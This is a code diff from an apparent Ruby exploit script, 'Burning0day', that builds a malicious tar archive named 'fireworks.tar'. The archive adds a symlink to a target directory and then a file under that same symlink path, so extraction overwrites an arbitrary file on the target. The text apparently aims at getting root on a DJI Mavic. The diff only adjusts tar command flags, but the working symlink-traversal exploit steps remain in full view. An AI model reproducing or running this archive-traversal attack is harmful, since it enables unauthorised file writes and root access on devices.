@@ -273,20 +273,18 @@ if win == 1
     system("win32\\rm -rf symlink Burning0day.txt fireworks.tar")
     File.open("Burning0day.txt", 'a') {|f| f.write("\nget root... Thx for all the fish P0V\n") }
     puts "Creating the tar file"
-    # Note: --owner=1/--group=1 forces file uid/gid to root for CygWin, as we're not running as root
-    # This is probably not strictly necessary, but "keeps it clean" on the Mavic 
-    system("win32\\tar cvpf fireworks.tar --owner=1 --group=1 Burning0day.txt")
+    system("win32\\tar -cvpf fireworks.tar Burning0day.txt")
     puts "Making the symlinks" 
     system("win32\\ln -s " + destdir + " symlink")
     puts "Adding the fireworks..."
-    system("win32\\tar --add-file -f fireworks.tar symlink")
+    system("win32\\tar -r -f fireworks.tar symlink")
     system("win32\\rm -rf symlink")
     system("win32\\mkdir symlink")
     # fuck we need chmod from Cygwin added to finish this. 
     File.open("symlink/" + destfile , 'w') {|f| f.write(nastyfile) }
 #    system("win32\\chmod 755 " + "symlink/" + destfile )  # Need to add chmod from cygwin... 
     puts "Boom headshot!"
-    system("win32\\tar --add-file -pf fireworks.tar symlink/" + destfile)
+    system("win32\\tar -r -pf fireworks.tar symlink/" + destfile)
 else
     system("rm -rf symlink Burning0day.txt fireworks.tar")
     system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
